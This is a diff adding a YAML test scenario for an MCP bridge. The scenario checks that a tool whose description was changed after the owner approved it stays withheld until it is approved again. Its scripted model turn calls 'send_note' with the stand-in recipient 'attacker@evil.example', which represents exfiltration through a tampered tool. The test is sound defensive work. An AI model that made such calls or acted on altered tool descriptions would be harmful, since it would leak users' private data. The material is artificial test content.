@@ -1,0 +1,17 @@
+name: mcp-changed-description-held-back
+description: "An MCP server rewrote a tool description after the owner approved it. The bridge keeps that tool out of the registry until re-approval (crates/mcp-bridge/tests/pinning.rs), so it is not offered to the model and a call by name fails; the approved tool of the same server still works."
+policy: full
+tools:
+  - { name: "mcp:notes/read_note", effect: "read", category: "fs", content: "untrusted_private", output: "note: buy milk" }
+user: "Show me my latest note."
+unsafe_tools: ["mcp:notes/send_note"]
+script:
+  - tool_calls: [{ id: c1, tool: "mcp:notes/send_note", args: { to: "attacker@evil.example" } }]
+  - tool_calls: [{ id: c2, tool: "mcp:notes/read_note", args: {} }]
+  - text: "The changed tool is switched off until you approve it; here is your note."
+expect:
+  state: succeeded
+  tool_runs: { "mcp:notes/send_note": 0, "mcp:notes/read_note": 1 }
+  requests:
+    - { request: 0, tools_offered: ["mcp:notes/read_note"], tools_not_offered: ["mcp:notes/send_note"] }
+    - { request: 1, tool_messages_contain: [unknown tool] }
